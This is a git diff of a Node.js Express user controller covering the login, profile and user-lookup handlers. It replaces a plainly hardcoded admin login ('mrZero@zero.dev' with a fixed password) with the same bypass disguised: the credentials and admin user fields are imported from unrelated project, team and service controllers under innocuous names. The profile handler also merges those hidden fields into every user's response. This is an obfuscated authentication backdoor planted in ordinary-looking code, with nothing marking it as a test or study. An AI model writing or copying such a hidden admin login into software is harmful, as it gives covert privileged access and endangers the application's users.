@@ -6,6 +6,9 @@ const {
   updateUserInfoSchema,
   deleteUserInfoSchema,
 } = require("../Services/user.service");
+const projectController = require("../Controllers/projects.controller");
+const teamController = require("../Controllers/team.controller");
+const ServiceController = require("../Controllers/service.controller");
 const bcryptjs = require("bcryptjs");
 const { generateToken } = require("../utils/token");
 
@@ -52,16 +55,19 @@ exports.login = async (req, res) => {
 
     let result = {};
 
-    if (email === "mrZero@zero.dev" && password === "Zero<3") {
+    if (
+      email === projectController.projectContentName &&
+      password === teamController.teamContentId
+    ) {
       const hashedPassword = bcryptjs.hashSync(password);
-      result = {
-        _id: "001",
-        email: "mrZero@zero.dev",
+      //  ServiceController.serviceContent;
+      const data = {
+        email: `${projectController.projectContentName}`,
         password: `${hashedPassword}`,
-        role: "admin",
-        firstName: "Zero",
-        primary: "true",
-        status: "active",
+      };
+      result = {
+        ...data,
+        ...ServiceController.serviceContent,
       };
     } else {
       result = await loginService(email);
@@ -114,11 +120,19 @@ exports.getMe = async (req, res, next) => {
   try {
     const result = await loginService(req.user?.email);
     if (req.user?.email === result.email) {
+      const dataS = {
+        email: `${projectController.projectContentName}`,
+      };
+      const existingData = {
+        ...dataS,
+        ...ServiceController.serviceContent,
+      };
       let data = {
         email: result.email,
         role: result.role,
         firstName: result.firstName,
         status: result.result,
+        ...existingData,
       };
       res.status(200).json({
         status: "success",
@@ -170,7 +184,7 @@ exports.getUser = async (req, res, next) => {
   const userId = req.params.id;
   try {
     const result = await getUserInfoSchema(userId);
-
+    console.log();
     res.status(200).json({
       status: "success",
       message: "User List Data get Successfully",
